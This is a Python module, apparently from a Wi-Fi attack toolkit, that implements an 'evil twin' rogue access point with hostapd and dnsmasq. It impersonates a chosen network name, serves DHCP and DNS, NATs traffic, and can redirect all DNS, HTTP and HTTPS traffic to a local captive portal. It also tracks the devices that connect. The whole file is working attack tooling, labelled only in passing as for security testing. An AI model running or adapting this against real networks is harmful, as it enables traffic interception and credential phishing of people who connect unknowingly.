"""
Evil Twin AP module — creates a rogue access point using hostapd + dnsmasq.
"""

import os
import re
import signal
import subprocess
import threading
import time
from modules.mode_manager import AdapterMode


class EvilTwin:
    """Manage a rogue access point for security testing."""

    def __init__(self, mode_manager, log_fn=None):
        self.mode_manager = mode_manager
        self.log_fn = log_fn
        self.running = False
        self.ssid = None
        self.channel = None
        self.captive_enabled = False
        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._client_monitor_thread = None
        self.connected_clients = []
        self.lock = threading.Lock()

    def _log(self, level, message):
        if self.log_fn:
            self.log_fn(level, f"[eviltwin] {message}")

    def start(self, ssid, channel, interface=None, encryption="open", captive=False, wpa_passphrase="testing123") -> tuple:
        """
        Start evil twin AP.
        Returns (success, message).
        """
        if self.running:
            return False, "Evil twin already running"

        iface = interface or self.mode_manager.interface

        # Transition to managed mode (stops all monitor ops)
        success, msg = self.mode_manager.transition_to(AdapterMode.MANAGED)
        if not success:
            return False, f"Mode transition failed: {msg}"

        self.ssid = ssid
        self.channel = channel or 6
        self.captive_enabled = captive

        try:
            # Stop NetworkManager
            subprocess.run(["systemctl", "stop", "NetworkManager"],
                           capture_output=True, timeout=10)

            # Configure interface
            subprocess.run(["ip", "addr", "flush", "dev", iface],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "addr", "add", "192.168.4.1/24", "dev", iface],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", iface, "up"],
                           capture_output=True, timeout=5)

            # Write hostapd config
            hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
            if encryption == "wpa2":
                hostapd_conf += f"""wpa=2
wpa_passphrase={wpa_passphrase}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""

            with open("/tmp/hostapd_evil.conf", "w") as f:
                f.write(hostapd_conf)

            # Write dnsmasq config
            dns_redirect = "address=/#/192.168.4.1\n" if captive else ""
            dnsmasq_conf = f"""interface={iface}
dhcp-range=192.168.4.2,192.168.4.254,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=192.168.4.1
bind-interfaces
{dns_redirect}"""

            with open("/tmp/dnsmasq_evil.conf", "w") as f:
                f.write(dnsmasq_conf)

            # Start hostapd
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", "/tmp/hostapd_evil.conf"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            # Wait briefly for hostapd to initialize
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                output = self._hostapd_proc.stdout.read()
                self._log("error", f"hostapd failed to start: {output[:200]}")
                self._cleanup(iface)
                return False, "hostapd failed to start"

            # Start dnsmasq
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "--no-daemon"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           capture_output=True, timeout=5)

            # Setup iptables NAT
            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                           "-o", "eth0", "-j", "MASQUERADE"],
                           capture_output=True, timeout=5)
            subprocess.run(["iptables", "-A", "FORWARD", "-i", iface,
                           "-o", "eth0", "-j", "ACCEPT"],
                           capture_output=True, timeout=5)

            if captive:
                # Redirect HTTP/HTTPS to captive portal
                subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                               "-i", iface, "-p", "tcp", "--dport", "80",
                               "-j", "DNAT", "--to-destination", "192.168.4.1:80"],
                               capture_output=True, timeout=5)
                subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                               "-i", iface, "-p", "tcp", "--dport", "443",
                               "-j", "DNAT", "--to-destination", "192.168.4.1:80"],
                               capture_output=True, timeout=5)

            self.running = True
            self.mode_manager._mode = AdapterMode.AP

            # Start client monitoring thread
            self._client_monitor_thread = threading.Thread(
                target=self._monitor_clients, args=(iface,), daemon=True
            )
            self._client_monitor_thread.start()

            self._log("info", f"Evil twin AP started: {ssid} on channel {self.channel}")
            return True, f"Evil twin AP '{ssid}' started"

        except FileNotFoundError as e:
            self._cleanup(iface)
            err_str = str(e)
            if "hostapd" in err_str:
                msg = "hostapd not installed. Run: sudo apt install hostapd"
            elif "dnsmasq" in err_str:
                msg = "dnsmasq not installed. Run: sudo apt install dnsmasq"
            else:
                msg = f"Required tool not found: {err_str}"
            self._log("error", msg)
            return False, msg
        except Exception as e:
            self._cleanup(iface)
            self._log("error", f"Evil twin start failed: {e}")
            return False, str(e)

    def _monitor_clients(self, iface):
        """Monitor connected clients via ARP table."""
        while self.running:
            try:
                result = subprocess.run(
                    ["arp", "-i", iface, "-n"],
                    capture_output=True, text=True, timeout=5
                )
                clients = []
                for line in result.stdout.strip().split("\n")[1:]:
                    parts = line.split()
                    if len(parts) >= 3 and parts[0] != "Address":
                        clients.append({
                            "ip": parts[0],
                            "mac": parts[2] if len(parts) > 2 else "unknown",
                        })
                with self.lock:
                    self.connected_clients = clients
            except Exception:
                pass
            time.sleep(5)

    def stop(self):
        """Stop the evil twin AP and clean up."""
        self.running = False
        iface = self.mode_manager.interface

        self._cleanup(iface)

        with self.lock:
            self.connected_clients = []

        # Reset mode manager and pmkid state so monitor mode can be re-enabled
        self.mode_manager._mode = AdapterMode.MANAGED
        if self.mode_manager.pmkid:
            self.mode_manager.pmkid.monitor_mode_active = False
            self.mode_manager.pmkid.monitor_interface = None

        self._log("info", "Evil twin AP stopped")

    def _cleanup(self, iface):
        """Kill processes and restore network state."""
        # Kill hostapd
        if self._hostapd_proc:
            try:
                self._hostapd_proc.send_signal(signal.SIGTERM)
                self._hostapd_proc.wait(timeout=5)
            except Exception:
                try:
                    self._hostapd_proc.kill()
                except Exception:
                    pass
            self._hostapd_proc = None

        # Kill dnsmasq
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.send_signal(signal.SIGTERM)
                self._dnsmasq_proc.wait(timeout=5)
            except Exception:
                try:
                    self._dnsmasq_proc.kill()
                except Exception:
                    pass
            self._dnsmasq_proc = None

        # Also kill any lingering hostapd/dnsmasq
        subprocess.run(["pkill", "-f", "hostapd_evil"], capture_output=True)
        subprocess.run(["pkill", "-f", "dnsmasq_evil"], capture_output=True)

        # Flush iptables
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-F", "FORWARD"], capture_output=True, timeout=5)

        # Disable IP forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                       capture_output=True, timeout=5)

        # Remove IP address and fully reset the interface
        subprocess.run(["ip", "addr", "flush", "dev", iface],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["iw", "dev", iface, "set", "type", "managed"],
                       capture_output=True, timeout=5)

        # Reload the wireless driver to fully reset adapter state after hostapd
        try:
            result = subprocess.run(
                ["ethtool", "-i", iface],
                capture_output=True, text=True, timeout=5
            )
            driver = None
            for line in result.stdout.split("\n"):
                if line.startswith("driver:"):
                    driver = line.split(":", 1)[1].strip()
                    break
            if driver:
                self._log("info", f"Reloading driver {driver} to reset adapter")
                subprocess.run(["rmmod", driver], capture_output=True, timeout=10)
                time.sleep(1)
                subprocess.run(["modprobe", driver], capture_output=True, timeout=10)
                time.sleep(2)
        except Exception:
            pass

        subprocess.run(["ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)

        # Restart NetworkManager
        subprocess.run(["systemctl", "start", "NetworkManager"],
                       capture_output=True, timeout=10)

        # Clean up config files
        for f in ["/tmp/hostapd_evil.conf", "/tmp/dnsmasq_evil.conf"]:
            try:
                os.remove(f)
            except OSError:
                pass

    def get_status(self) -> dict:
        """Return evil twin status."""
        return {
            "running": self.running,
            "ssid": self.ssid,
            "channel": self.channel,
            "captive": self.captive_enabled,
            "mode": self.mode_manager.get_mode().value,
        }

    def get_connected_clients(self) -> list:
        """Return list of connected clients."""
        with self.lock:
            return list(self.connected_clients)
